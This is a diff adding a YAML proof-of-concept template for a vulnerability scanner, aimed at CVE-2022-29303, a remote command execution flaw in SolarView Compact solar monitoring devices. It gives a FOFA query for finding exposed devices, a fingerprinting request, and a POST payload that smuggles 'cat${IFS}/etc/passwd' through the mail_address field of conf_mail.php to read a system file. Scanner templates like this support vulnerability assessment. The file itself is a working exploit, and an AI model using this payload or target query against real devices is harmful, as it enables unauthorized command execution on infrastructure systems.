@@ -1,0 +1,23 @@
+id: poc-yaml-solarview-compact-conf-mail-php-rce
+info:
+  name: SolarView Compact conf_mail.php 远程命令执行漏洞(CVE-2022-29303)
+  severity: critical
+  tags:
+  - 两高一弱
+  - rce
+  - CVE-2022-29303
+  finger: SolarView Compact
+  fofa: body="SolarView Compact" && title=="Top"
+requests:
+- method: GET
+  path: /conf_mail.php
+  expression: status_code == 200 && contains(body,"/cgi-bin/p1_network_mail.cgi")
+- method: POST
+  path: /conf_mail.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: mail_address=%0acat${IFS}/etc/passwd%0a&button=%83%81%81%5B%83%8B%91%97%90M
+  expression: status_code == 200 && contains(body,"root:") && contains(body,"/bin")
+    && duration > 5
+variables: {}
+transport: http
